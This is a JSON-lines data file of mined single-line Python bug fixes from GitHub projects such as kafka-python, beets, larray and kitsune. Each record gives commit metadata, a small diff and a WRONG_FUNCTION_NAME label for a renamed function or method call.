{"project": "NIPAP", "commit_sha": "2526c4627cff5c504910d84e4f1d37a5b8b70d9c", "parent_sha": "581bf898c9994c3d9c7be65a1a58e9116b52c68f", "file_path": "tests/napbase.py", "project_url": "https://github.com/fredsod/NIPAP", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -401,7 +401,7 @@ class NapTest(unittest.TestCase):\n \n         # fetch many prefixes - all in a schema\n         prefix = self.nap.list_prefix(schema, {})\n-        self.assertGreater(len(prefix), 0, 'Found 0 prefixes in schema ' + self.schema_attrs['name'])\n+        self.assertNotEqual(len(prefix), 0, 'Found 0 prefixes in schema ' + self.schema_attrs['name'])\n \n \n \n", "before": "self . assertGreater ( len ( prefix ) , 0 , 'Found 0 prefixes in schema ' + self . schema_attrs [ 'name' ] )", "after": "self . assertNotEqual ( len ( prefix ) , 0 , 'Found 0 prefixes in schema ' + self . schema_attrs [ 'name' ] )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:assertGreater\", 3, 14, 3, 27], \"assertNotEqual\"]]"}
{"project": "tools_repo", "commit_sha": "75b4c2deac9ff23a5a3c24b3d2450cd23ae3d705", "parent_sha": "b75415075c00bb17e14c5666a380b7e940db8c84", "file_path": "subcmds/info.py", "project_url": "https://github.com/LineageOS/tools_repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class Info(PagedCommand):\n     self.headtext = self.out.printer('headtext', fg = 'yellow')\n     self.redtext = self.out.printer('redtext', fg = 'red')\n     self.sha = self.out.printer(\"sha\", fg = 'yellow')\n-    self.text = self.out.printer('text')\n+    self.text = self.out.nofmt_printer('text')\n     self.dimtext = self.out.printer('dimtext', attr = 'dim')\n \n     self.opt = opt\n", "before": "self . text = self . out . printer ( 'text' )", "after": "self . text = self . out . nofmt_printer ( 'text' )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:printer\", 3, 26, 3, 33], \"nofmt_printer\"]]"}
{"project": "flocker", "commit_sha": "11fc93afea2ab79bdcdf44789caf8ccf9852977c", "parent_sha": "dea25749c8db7d739ab50275af910bfbd3c017cf", "file_path": "flocker/node/agents/test/test_blockdevice.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -541,7 +541,7 @@ class BlockDeviceDeployerDestructionCalculateChangesTests(\n         other_node = u\"192.0.2.2\"\n         local_state = self.ONE_DATASET_STATE\n-        cluster_state = Deployment(\n+        cluster_state = DeploymentState(\n             nodes={to_node(local_state)}\n         )\n \n", "before": "cluster_state = Deployment ( nodes = { to_node ( local_state ) } )", "after": "cluster_state = DeploymentState ( nodes = { to_node ( local_state ) } )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:Deployment\", 2, 25, 2, 35], \"DeploymentState\"]]"}
{"project": "beets", "commit_sha": "268dcb0008228912c305fc6e8818dafda3b48555", "parent_sha": "9655775b0b5e15d60ff5ecce3430fe8737a053a3", "file_path": "test/helper.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ class LogCapture(logging.Handler):\n         self.messages = []\n \n     def emit(self, record):\n-        self.messages.append(str(record.msg))\n+        self.messages.append(unicode(record.msg))\n \n \n @contextmanager\n", "before": "self . messages . append ( str ( record . msg ) )", "after": "self . messages . append ( unicode ( record . msg ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:str\", 3, 30, 3, 33], \"unicode\"]]"}
{"project": "flocker", "commit_sha": "3c465a662858c143407aeaf2602cc265a0d7e7d9", "parent_sha": "d14f5e56d6edbe0d2589e08f0152cdcf0fe1aaef", "file_path": "flocker/node/functional/test_deploy.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -114,7 +114,7 @@ def change_node_state(deployer, desired_configuration):\n                           applications=[],\n                           manifestations={}, paths={}, devices={}),\n             }),\n-            persistent_state=state_recorder.get_model(),\n+            persistent_state=state_recorder.get_state(),\n         )\n \n         def got_changes(local_state):\n", "before": "persistent_state = state_recorder . get_model ( ) ,", "after": "persistent_state = state_recorder . get_state ( ) ,", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:get_model\", 3, 45, 3, 54], \"get_state\"]]"}
{"project": "beets", "commit_sha": "99e36d870e22036ece8e31e1dac5f6336763967a", "parent_sha": "57e66d7b1ac07eff23cae59e90558046664168aa", "file_path": "beets/library.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -276,7 +276,7 @@ class Item(object):\n         try:\n             f = MediaFile(syspath(read_path))\n         except Exception:\n-            log.error(u'failed reading file: {0}'.format(\n+            log.debug(u'failed reading file: {0}'.format(\n                 displayable_path(read_path))\n             )\n             raise\n", "before": "log . error ( u'failed reading file: {0}' . format ( displayable_path ( read_path ) ) )", "after": "log . debug ( u'failed reading file: {0}' . format ( displayable_path ( read_path ) ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:error\", 3, 17, 3, 22], \"debug\"]]"}
{"project": "larray", "commit_sha": "2742b4420524552d74077bb16a9d77adb7cd1267", "parent_sha": "f86f06a0b0810683e25db9139cff69ec56acda69", "file_path": "larray/core.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -331,7 +331,7 @@ def to_ticks(s):\n     if isinstance(s, LKey):\n         # a single ValueGroup used for all ticks of an Axis\n-        raise NotImplemented(\"not sure what to do with it yet\")\n+        raise NotImplementedError(\"not sure what to do with it yet\")\n     elif isinstance(s, pd.Index):\n         return s.values\n     elif isinstance(s, np.ndarray):\n", "before": "raise NotImplemented ( \"not sure what to do with it yet\" )", "after": "raise NotImplementedError ( \"not sure what to do with it yet\" )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:NotImplemented\", 2, 15, 2, 29], \"NotImplementedError\"]]"}
{"project": "larray", "commit_sha": "bbb41e811a7b4b843cddf76b9d36985d8e1e5e32", "parent_sha": "374768c5b99d67448c46b536a7570b6d4836d39e", "file_path": "larray/viewer.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1501,7 +1501,7 @@ class ArrayEditorWidget(QWidget):\n \n         # transform local label key to local index key\n         try:\n-            index_key = filtered.translated_key(dkey)\n+            index_key = filtered._translated_key(dkey)\n         except ValueError:\n             return None\n \n", "before": "index_key = filtered . translated_key ( dkey )", "after": "index_key = filtered . _translated_key ( dkey )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:translated_key\", 3, 34, 3, 48], \"_translated_key\"]]"}
{"project": "PyMySQL", "commit_sha": "8a83c101c51e4264bc1de42f2620ffdb40a1e4cf", "parent_sha": "68a37f11159581668476fd73ca153813cad4f1f2", "file_path": "pymysql/__init__.py", "project_url": "https://github.com/fanout/PyMySQL", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ ROWID     = DBAPISet()\n \n def Binary(x):\n     \"\"\"Return x as a binary type.\"\"\"\n-    return str(x)\n+    return bytes(x)\n \n def Connect(*args, **kwargs):\n", "before": "return str ( x )", "after": "return bytes ( x )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:str\", 3, 12, 3, 15], \"bytes\"]]"}
{"project": "PyMySQL", "commit_sha": "cb2d9b8933e0f0c9e93875382217bd1e41ede0c2", "parent_sha": "b4284c980c1e561b2ca9966d30869fa0f545e772", "file_path": "pymysql/connections.py", "project_url": "https://github.com/fanout/PyMySQL", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -665,7 +665,7 @@ class Connection(object):\n     def _read_ok_packet(self):\n         pkt = self._read_packet()\n         if not pkt.is_ok_packet():\n-            raise OperationalErrorl(2014, \"Command Out of Sync\")\n+            raise OperationalError(2014, \"Command Out of Sync\")\n         ok = OKPacketWrapper(pkt)\n         self.server_status = ok.server_status\n         return True\n", "before": "raise OperationalErrorl ( 2014 , \"Command Out of Sync\" )", "after": "raise OperationalError ( 2014 , \"Command Out of Sync\" )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:OperationalErrorl\", 3, 19, 3, 36], \"OperationalError\"]]"}
{"project": "LanguageSelector", "commit_sha": "b561d46e8cc5ec5ce2edc44fd586d68e7cb08244", "parent_sha": "a387d2c05e75442433cd6333613f5bb63d213717", "file_path": "language-selector.py", "project_url": "https://github.com/FluidIdeas/LanguageSelector", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ class MainFrame(wx.Frame):\n                 self.LanguageSelector.Append(locale)\n \n     def OnClick(self, event):\n-        process = Popen(['sudo', '/opt/LanguageSelector/changelocale.sh', self.LanguageSelector.GetValue()], stdout=PIPE)\n+        process = Popen(['sudo', '/opt/LanguageSelector/changelocale.sh', self.LanguageSelector.GetStringSelection()], stdout=PIPE)\n         (output, err) = process.communicate()\n         exit_code = process.wait()\n         exit(0)\n", "before": "process = Popen ( [ 'sudo' , '/opt/LanguageSelector/changelocale.sh' , self . LanguageSelector . GetValue ( ) ] , stdout = PIPE )", "after": "process = Popen ( [ 'sudo' , '/opt/LanguageSelector/changelocale.sh' , self . LanguageSelector . GetStringSelection ( ) ] , stdout = PIPE )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:GetValue\", 3, 97, 3, 105], \"GetStringSelection\"]]"}
{"project": "larray", "commit_sha": "525e261b58c0e97bf43bf5a8dc7d934ab31117b3", "parent_sha": "eabf5289908714910a669dca64664c1ba3e26f4b", "file_path": "larray/core/group.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1359,7 +1359,7 @@ class LGroup(Group):\n         if bound is None:\n             bound = self.key\n         if isinstance(self.axis, ABCAxis):\n-            pos = self.axis.translate(bound)\n+            pos = self.axis.index(bound)\n             return pos + int(stop) if np.isscalar(pos) else pos\n         else:\n             raise ValueError(\"Cannot translate an LGroup without axis\")\n", "before": "pos = self . axis . translate ( bound )", "after": "pos = self . axis . index ( bound )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:translate\", 3, 29, 3, 38], \"index\"]]"}
{"project": "soy", "commit_sha": "fccd4c4f5660d8b8ff943f8f00e8f7c3fc82980d", "parent_sha": "61dcab236448d47416bc8dce30c2367a7c015e12", "file_path": "soy/nlp/space/count_space.py", "project_url": "https://github.com/summatic/soy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -157,7 +157,7 @@ class Model:\n     \n     def filter_counters(self, num_doc):\n         before = self.CF.num_of_tags()\n-        self.CF.filter_words(self.min_count)\n+        self.CF.filter_tags(self.min_count)\n         after = self.CF.num_of_tags()\n         sys.stdout.write('\\rall tags length = %d --> %d, (num_doc = %d)' % (before, after, num_doc))\n     \n", "before": "self . CF . filter_words ( self . min_count )", "after": "self . CF . filter_tags ( self . min_count )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:filter_words\", 3, 17, 3, 29], \"filter_tags\"]]"}
{"project": "h", "commit_sha": "7050af7dadd33f2ce029f78dc45616e30cbed854", "parent_sha": "d03fd3628d990ec1167078f220bff0d8ee8d77e4", "file_path": "h/accounts/models.py", "project_url": "https://github.com/project-star/h", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class User(Base):\n         if not self.salt:\n             self.salt = _generate_random_string(24)\n \n-        return unicode(CRYPT.encode(password + self.salt))\n+        return text_type(CRYPT.encode(password + self.salt))\n \n     @classmethod\n     def get_by_email(cls, email):\n", "before": "return unicode ( CRYPT . encode ( password + self . salt ) )", "after": "return text_type ( CRYPT . encode ( password + self . salt ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:unicode\", 3, 16, 3, 23], \"text_type\"]]"}
{"project": "django-contrib-comments", "commit_sha": "07affdeed8bfce34761c6611573fe6ccce2c9f61", "parent_sha": "5fade4566c673bb94bb2c7d026d380300fe98cc9", "file_path": "tests/testapp/tests/test_comment_views.py", "project_url": "https://github.com/citizenline/django-contrib-comments", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -246,7 +246,7 @@ class CommentViewTests(CommentTestCase):\n         response = self.client.post(\"/post/\", data)\n         location = response[\"Location\"]\n         match = post_redirect_re.match(location)\n-        self.assertisNotNone(match, \"Unexpected redirect location: %s\" % location)\n+        self.assertIsNotNone(match, \"Unexpected redirect location: %s\" % location)\n \n         data[\"next\"] = \"/somewhere/else/\"\n         data[\"comment\"] = \"This is another comment\"\n", "before": "self . assertisNotNone ( match , \"Unexpected redirect location: %s\" % location )", "after": "self . assertIsNotNone ( match , \"Unexpected redirect location: %s\" % location )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:assertisNotNone\", 3, 14, 3, 29], \"assertIsNotNone\"]]"}
{"project": "kafka-python", "commit_sha": "21d68c98470eab6b9e7e5c934017af4a4fd24748", "parent_sha": "f0ef99f0e280f672289edab58c7f4a42341c01ab", "file_path": "kafka/client_async.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -545,7 +545,7 @@ class KafkaClient(object):\n         elif timeout_ms is None:\n             timeout_ms = self.config['request_timeout_ms']\n         elif not isinstance(timeout_ms, (int, float)):\n-            raise RuntimeError('Invalid type for timeout: %s' % type(timeout_ms))\n+            raise TypeError('Invalid type for timeout: %s' % type(timeout_ms))\n \n         # Loop for futures, break after first loop if None\n         responses = []\n", "before": "raise RuntimeError ( 'Invalid type for timeout: %s' % type ( timeout_ms ) )", "after": "raise TypeError ( 'Invalid type for timeout: %s' % type ( timeout_ms ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:RuntimeError\", 3, 19, 3, 31], \"TypeError\"]]"}
{"project": "kafka-python", "commit_sha": "6b02c7dc3baa09432f2c1257ab3c4064fd8820d0", "parent_sha": "59ac7d6ca663929fd95c30ce3c9fe6c805e54993", "file_path": "kafka/conn.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -326,7 +326,7 @@ class BrokerConnection(object):\n             error = Errors.CorrelationIdError(\n                 'Correlation ids do not match: sent %d, recv %d'\n                 % (ifr.correlation_id, recv_correlation_id))\n-            ifr.future.fail(error)\n+            ifr.future.failure(error)\n             self.close()\n             self._processing = False\n             return None\n", "before": "ifr . future . fail ( error )", "after": "ifr . future . failure ( error )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:fail\", 3, 24, 3, 28], \"failure\"]]"}
{"project": "kafka-python", "commit_sha": "61eb396bba268f892a657b2e4d7bd813aabc88ec", "parent_sha": "c741c5342e8fbf682d6b2811ecde4f1b0491a655", "file_path": "kafka/conn.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -511,7 +511,7 @@ class BrokerConnection(object):\n         self._rbuffer.seek(0)\n         self._rbuffer.truncate()\n         if error is None:\n-            error = Errors.ConnectionError(str(self))\n+            error = Errors.Cancelled(str(self))\n         while self.in_flight_requests:\n             ifr = self.in_flight_requests.popleft()\n             ifr.future.failure(error)\n", "before": "error = Errors . ConnectionError ( str ( self ) )", "after": "error = Errors . Cancelled ( str ( self ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:ConnectionError\", 3, 28, 3, 43], \"Cancelled\"]]"}
{"project": "kafka-python", "commit_sha": "3376ed1cef3e29877f773017117d90192ccf9a5e", "parent_sha": "718e5fb66da5dca449aa31d305b8867fba4f783c", "file_path": "kafka/client.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ class KafkaClient(object):\n                 log.warning('KafkaUnavailableError attempting to send request '\n                             'on topic %s partition %d', payload.topic, payload.partition)\n                 topic_partition = (payload.topic, payload.partition)\n-                responses[topic_partition] = FailedPayloadsErrors(payload)\n+                responses[topic_partition] = FailedPayloadsError(payload)\n \n         # For each broker, send the list of request payloads\n         # and collect the responses and errors\n", "before": "responses [ topic_partition ] = FailedPayloadsErrors ( payload )", "after": "responses [ topic_partition ] = FailedPayloadsError ( payload )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:FailedPayloadsErrors\", 3, 46, 3, 66], \"FailedPayloadsError\"]]"}
{"project": "kafka-python", "commit_sha": "1dd9e8bb05b6efc2888ac4cae8e7199b35dd633f", "parent_sha": "b6a2ad9caa8d7b5b87d3808650376e7751d4e4da", "file_path": "kafka/client_async.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -324,7 +324,7 @@ class KafkaClient(object):\n         # if we found no connected node, return a disconnected one\n         log.debug(\"No connected nodes found. Trying disconnected nodes.\")\n         for node_id in nodes:\n-            if not self._conns[node_id].is_blacked_out():\n+            if not self._conns[node_id].blacked_out():\n                 return node_id\n \n         # if still no luck, look for a node not in self._conns yet\n", "before": "if not self . _conns [ node_id ] . is_blacked_out ( ) : return node_id", "after": "if not self . _conns [ node_id ] . blacked_out ( ) : return node_id", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:is_blacked_out\", 3, 41, 3, 55], \"blacked_out\"]]"}
{"project": "depl", "commit_sha": "fc0225b84f9205e4ff8d0cdcf66bf8e591ac3a77", "parent_sha": "91d1a7741e47cfddcd3f0d8e696a1276acd4508f", "file_path": "test/deploy/test_python.py", "project_url": "https://github.com/dbrgn/depl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,4 +14,4 @@ def test_flask_simple(tempdir):\n     flask_path = join(dirname(abspath(__file__)), 'sample', 'flask')\n     move_dir_content(flask_path, str(tempdir))\n     main_run(['depl', 'deploy', 'localhost'])\n-    assert urllib.urlopen(\"http://localhost:8888/\").getcode() == \"Hello World!\"\n+    assert urllib.urlopen(\"http://localhost:8888/\").read() == \"Hello World!\"\n", "before": "assert urllib . urlopen ( \"http://localhost:8888/\" ) . getcode ( ) == \"Hello World!\"", "after": "assert urllib . urlopen ( \"http://localhost:8888/\" ) . read ( ) == \"Hello World!\"", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:getcode\", 3, 53, 3, 60], \"read\"]]"}
{"project": "python-domino", "commit_sha": "59cfc4c6562f5c3ae1c21cf356299af4d3552efe", "parent_sha": "7e74b0a3161146a5e72514c5cd796550ac080020", "file_path": "domino/routes.py", "project_url": "https://github.com/marks/python-domino", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,4 +73,4 @@ class _Routes:\n     \n     # App URLs\n     def app_publish(self):\n-        return self._build_project_url() + '/nb/startSession'\n+        return self._build_project_url_private_api() + '/nb/startSession'\n", "before": "return self . _build_project_url ( ) + '/nb/startSession'", "after": "return self . _build_project_url_private_api ( ) + '/nb/startSession'", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:_build_project_url\", 3, 21, 3, 39], \"_build_project_url_private_api\"]]"}
{"project": "plyer", "commit_sha": "f7789ffc2aaeff0136a65886bd9c0ea867a61ab9", "parent_sha": "22a1fee879f0b65a220dd0557329351b0a825aa3", "file_path": "plyer/platforms/macosx/filechooser.py", "project_url": "https://github.com/elvis124/plyer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ class MacFileChooser(object):\n             url = NSURL.fileURLWithPath_(self.path)\n             panel.setDirectoryURL_(url)\n \n-        if panel.runModal_():\n+        if panel.runModal():\n             if self.mode == \"save\" or not self.multiple:\n                 return [panel.filename().UTF8String()]\n             else:\n", "before": "if panel . runModal_ ( ) : if self . mode == \"save\" or not self . multiple : return [ panel . filename ( ) . UTF8String ( ) ] else : ", "after": "if panel . runModal ( ) : if self . mode == \"save\" or not self . multiple : return [ panel . filename ( ) . UTF8String ( ) ] else : ", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:runModal_\", 3, 18, 3, 27], \"runModal\"]]"}
{"project": "plyer", "commit_sha": "bb993aaeeaece2a2d752dfb0cdb73f486f2a1db2", "parent_sha": "362d6a0d8b9dd134f0263753fb2d76a6e6624985", "file_path": "plyer/platforms/ios/spatialorientation.py", "project_url": "https://github.com/elvis124/plyer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ class iOSSpatialOrientation(SpatialOrientation):\n \n     def __init__(self):\n         self.bridge = autoclass('bridge').alloc().init()\n-        self.bridge.motionManager.setdeviceMotionUpdateInterval_(0.1)\n+        self.bridge.motionManager.setDeviceMotionUpdateInterval_(0.1)\n \n     def _enable_listener(self):\n         self.bridge.startDeviceMotion()\n", "before": "self . bridge . motionManager . setdeviceMotionUpdateInterval_ ( 0.1 )", "after": "self . bridge . motionManager . setDeviceMotionUpdateInterval_ ( 0.1 )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:setdeviceMotionUpdateInterval_\", 3, 35, 3, 65], \"setDeviceMotionUpdateInterval_\"]]"}
{"project": "kitsune", "commit_sha": "279271ec62e810d14b32d4e7c27738372fcc478f", "parent_sha": "3ff335b0763d5eac6feb4109881685d8c7a1324b", "file_path": "apps/wiki/tasks.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ def _rebuild_kb_chunk(data):\n             url = document.redirect_url()\n             if (url and points_to_document_view(url) and\n                 not document.redirect_document()):\n-                log.error('Invalid redirect document: %d' % pk)\n+                log.warn('Invalid redirect document: %d' % pk)\n \n             html = Revision.objects.get(\n                 id=document.current_revision_id).content_parsed\n", "before": "log . error ( 'Invalid redirect document: %d' % pk )", "after": "log . warn ( 'Invalid redirect document: %d' % pk )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:error\", 3, 21, 3, 26], \"warn\"]]"}
{"project": "kitsune", "commit_sha": "6fc9dbb41a4e350714384f79945cb1903d184117", "parent_sha": "a728f26550de56cb7ae725e73f76fc7b4c322317", "file_path": "apps/wiki/tasks.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ def _rebuild_kb_chunk(data):\n             url = document.redirect_url()\n             if (url and points_to_document_view(url) and\n                 not document.redirect_document()):\n-                log.warn('Invalid redirect document: %d' % pk)\n+                log.error('Invalid redirect document: %d' % pk)\n \n             html = Revision.objects.get(\n                 id=document.current_revision_id).content_parsed\n", "before": "log . warn ( 'Invalid redirect document: %d' % pk )", "after": "log . error ( 'Invalid redirect document: %d' % pk )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:warn\", 3, 21, 3, 25], \"error\"]]"}
{"project": "kitsune", "commit_sha": "f7b08db6d3a303d174ff9c20f56856bbcea16b49", "parent_sha": "0cce09568b00df0af96c0346baf03b067aadb6bf", "file_path": "apps/wiki/tasks.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ def _rebuild_kb_chunk(data):\n             url = document.redirect_url()\n             if (url and points_to_document_view(url) and\n                 not document.redirect_document()):\n-                log.error('Invalid redirect document: %d' % pk)\n+                log.warn('Invalid redirect document: %d' % pk)\n \n             html = Revision.objects.get(\n                 id=document.current_revision_id).content_parsed\n", "before": "log . error ( 'Invalid redirect document: %d' % pk )", "after": "log . warn ( 'Invalid redirect document: %d' % pk )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:error\", 3, 21, 3, 26], \"warn\"]]"}
{"project": "edx-configuration", "commit_sha": "7783ecef15a4c69ddc8e97a05ff3828581095896", "parent_sha": "e7e2ea3962ffc5261c8a8e02b602581c42568735", "file_path": "util/vpc-tools/create_stack.py", "project_url": "https://github.com/Microsoft/edx-configuration", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ def create_stack(stack_name, template, region='us-east-1', blocking=True, temp_b\n             break\n \n     if status in FAILURE_STATES:\n-        raise Excoption('Creation Failed. Stack Status: {}, ID:{}'.format(\n+        raise Exception('Creation Failed. Stack Status: {}, ID:{}'.format(\n             status, stack_id))\n \n     return stack_id\n", "before": "raise Excoption ( 'Creation Failed. Stack Status: {}, ID:{}' . format ( status , stack_id ) )", "after": "raise Exception ( 'Creation Failed. Stack Status: {}, ID:{}' . format ( status , stack_id ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:Excoption\", 3, 15, 3, 24], \"Exception\"]]"}
{"project": "pyroboime", "commit_sha": "197088aa41c1e90a2c56979dd19b8588f87e0a58", "parent_sha": "1ef463e4525a8cd18381851022044f00f9244c73", "file_path": "roboime/interface/__init__.py", "project_url": "https://github.com/KN2C/pyroboime", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -131,7 +131,7 @@ class TxInterface(Interface):\n             world,\n             updaters=[\n                 updater.VisionUpdater(vision_address),\n-                updater.RealRefereeUpdater(referee_address),\n+                updater.RefereeUpdater(referee_address),\n             ],\n             commanders=[\n                 commander.Tx2013Commander(world.blue_team, mapping_dict=mapping_blue, kicking_power_dict=kick_mapping_blue, verbose=debug),\n", "before": "world , updaters = [ updater . VisionUpdater ( vision_address ) , updater . RealRefereeUpdater ( referee_address ) , ] ,", "after": "world , updaters = [ updater . VisionUpdater ( vision_address ) , updater . RefereeUpdater ( referee_address ) , ] ,", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:RealRefereeUpdater\", 3, 25, 3, 43], \"RefereeUpdater\"]]"}
{"project": "pulsar", "commit_sha": "1a4c34e9ad3cdb8583eb6b336a1c4fba995fc22d", "parent_sha": "6a4a0d22ada2f362ba2cd470f21428fabe4405de", "file_path": "pulsar/apps/tasks/scheduler.py", "project_url": "https://github.com/winggynOnly/pulsar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -154,7 +154,7 @@ and task scheduling.\n             monitor.put(task.serialize_for_queue())\r\n         else:\r\n             task._queued = False\r\n-            self.log.info('Task %s already requested, abort.', task)\r\n+            self.log.debug('Task %s already requested, abort.', task)\r\n         return task\r\n \r\n     def tick(self, monitor, now=None):\r\n", "before": "self . log . info ( 'Task %s already requested, abort.' , task )", "after": "self . log . debug ( 'Task %s already requested, abort.' , task )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 22, 3, 26], \"debug\"]]"}
{"project": "large-events", "commit_sha": "791a5ee97536b92bfa7e4e42228902d71d51dece", "parent_sha": "23c40b7788e4616ea4f69dc80d8aebc88de08ed8", "file_path": "posts/app.py", "project_url": "https://github.com/knative-portability/large-events", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ def find_posts_in_db(collection, post_id=None, event_id=None):\n         query = {\"post_id\": post_id}\n     elif event_id is not None:\n         query = {\"event_id\": event_id}\n-    cursor = collection.find_many(query)\n+    cursor = collection.find(query)\n     list_of_posts = []\n     for post in cursor:\n         list_of_posts.append(post)\n", "before": "cursor = collection . find_many ( query )", "after": "cursor = collection . find ( query )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:find_many\", 3, 25, 3, 34], \"find\"]]"}
{"project": "pero", "commit_sha": "ddd566675a11f435d4411071a578aca1a7c84cb8", "parent_sha": "2e3927dcdb4e28c464e7674670b61f6a381d037f", "file_path": "pero/drawing/layout.py", "project_url": "https://github.com/xxao/pero", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -680,7 +680,7 @@ class Cell(Graphics):\n         \n         # set clipping\n         if clip:\n-            canvas.clip(Path().rectangle(*content.rect))\n+            canvas.clip(Path().rect(*content.rect))\n         \n         # draw graphics\n         if graphics:\n", "before": "canvas . clip ( Path ( ) . rectangle ( * content . rect ) )", "after": "canvas . clip ( Path ( ) . rect ( * content . rect ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:rectangle\", 3, 32, 3, 41], \"rect\"]]"}
